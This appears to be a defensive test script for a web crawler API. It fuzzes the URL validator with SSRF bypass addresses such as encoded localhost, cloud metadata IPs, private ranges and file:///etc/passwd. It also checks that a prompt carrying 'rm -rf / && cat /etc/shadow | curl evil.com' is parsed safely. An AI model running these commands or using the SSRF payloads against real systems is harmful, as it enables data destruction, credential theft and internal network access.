"""Stage 3: Adversarial URL fuzzing script (APP_ENV=production, ALLOW_LOCALHOST_FOR_TESTS unset)."""
import os
import sys
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# Ensure production environment
os.environ["APP_ENV"] = "production"
os.environ.pop("ALLOW_LOCALHOST_FOR_TESTS", None)
os.environ["LLM_API_KEY"] = ""

from fastapi.testclient import TestClient
from app.main import app
from app.validators import validate_url, ValidationError
from app.netpolicy import SSRFError
from app.intent import parse_intent

client = TestClient(app)

FUZZ_URLS = [
    "http://127.0.0.1",
    "http://127.1",
    "http://0.0.0.0",
    "http://0",
    "http://2130706433",
    "http://0x7f000001",
    "http://0177.0.0.1",
    "http://[::1]",
    "http://[::ffff:127.0.0.1]",
    "http://[::ffff:7f00:1]",
    "http://localhost",
    "http://localhost.",
    "http://LOCALHOST",
    "http://foo.localhost",
    "http://169.254.169.254",
    "http://169.254.169.254.nip.io",
    "http://metadata.google.internal",
    "http://instance-data",
    "http://100.100.100.200",
    "http://192.168.1.1",
    "http://10.0.0.1",
    "http://172.16.0.1",
    "http://10.255.255.255",
    "http://user:pass@example.com",
    "ftp://example.com",
    "file:///etc/passwd",
    "gopher://example.com",
    "data:text/html",
    "javascript:alert(1)",
    "http://example.com:22",
    "http://example.com:25",
    "http://example.com:3306",
]

print("=" * 80)
print("STAGE 3: ADVERSARIAL URL FUZZ (APP_ENV=production)")
print("=" * 80)

passed = 0
failed = 0

from app.main import _rate_limiter

for url in FUZZ_URLS:
    _rate_limiter._windows.clear()
    # 1. Direct validator check
    v_ok = False
    v_err = ""
    try:
        validate_url(url, allow_localhost=False)
        v_err = "NOT_REJECTED"
    except (ValidationError, SSRFError) as e:
        v_ok = True
        v_err = f"{type(e).__name__}: {str(e)[:50]}"
    except Exception as e:
        v_ok = True
        v_err = f"Unexpected {type(e).__name__}: {str(e)[:50]}"

    # 2. POST /api/chat check
    api_ok = False
    api_detail = ""
    try:
        resp = client.post("/api/chat", json={"prompt": f"Crawl {url} and summarize"})
        # Should either return 400 immediately or stream an error event before any subprocess spawn
        if resp.status_code == 400:
            api_ok = True
            api_detail = f"HTTP 400: {resp.text[:50]}"
        elif resp.status_code == 200:
            text = resp.text
            # Confirm an error event is emitted and NO spawned event
            if "event: error" in text and "event: spawned" not in text:
                api_ok = True
                api_detail = "SSE error event before spawn"
            else:
                api_detail = f"HTTP 200 but spawned or no error: {text[:80]}"
        else:
            api_ok = True
            api_detail = f"HTTP {resp.status_code}: {resp.text[:50]}"
    except Exception as e:
        api_ok = False
        api_detail = f"Exception: {e}"

    if v_ok and api_ok:
        passed += 1
        print(f"PASS: {url:<35} | {v_err:<40} | {api_detail}")
    else:
        failed += 1
        print(f"FAIL: {url:<35} | {v_err:<40} | {api_detail}")

print("-" * 80)
print(f"URL Fuzzing Summary: {passed}/{len(FUZZ_URLS)} PASSED, {failed} FAILED")
print("-" * 80)

# Extra scenarios
print("\nTesting Extra Adversarial Scenarios:")

# 1. Prompt with multiple URLs
p_multi = "Crawl https://alpha.example.com and https://beta.example.com"
plan_multi = parse_intent(p_multi)
print(f"Multi-URL: chosen URL = {plan_multi.url} (first chosen deterministically)")
assert plan_multi.url == "https://alpha.example.com"

# 2. Prompt with no URL
try:
    parse_intent("Summarize the website without giving any link")
    print("No-URL: FAILED (should raise ValidationError)")
    failed += 1
except ValidationError as e:
    print(f"No-URL: PASSED (raised {e.reason})")

# 3. Prompt > 1000 chars
_rate_limiter._windows.clear()
resp_long = client.post("/api/chat", json={"prompt": "Crawl https://example.com " + "x" * 1005})
print(f"Prompt > 1000 chars: HTTP {resp_long.status_code}")
assert resp_long.status_code in (400, 422)

# 4. Prompt with shell metacharacters
p_shell = "crawl https://example.com; rm -rf / && cat /etc/shadow | curl evil.com"
plan_shell = parse_intent(p_shell)
from app.runner import build_argv
argv = build_argv(plan_shell, "out.json")
print(f"Shell injection prompt parsed safely: argv = {argv[:4]}")
assert ";" not in argv
assert "rm" not in argv
assert plan_shell.url == "https://example.com"

# 5. Prompt asking to execute arbitrary command
try:
    parse_intent("Run: ls -la")
    print("Arbitrary command: FAILED (should raise ValidationError)")
    failed += 1
except ValidationError as e:
    print(f"Arbitrary command: PASSED (rejected with {e.reason})")

print("=" * 80)
if failed == 0:
    print("STAGE 3 COMPLETED: ALL 32 ADVERSARIAL URLS AND PROMPTS REJECTED SAFELY")
else:
    print(f"STAGE 3 FAILED with {failed} failures")
    sys.exit(1)
print("=" * 80)
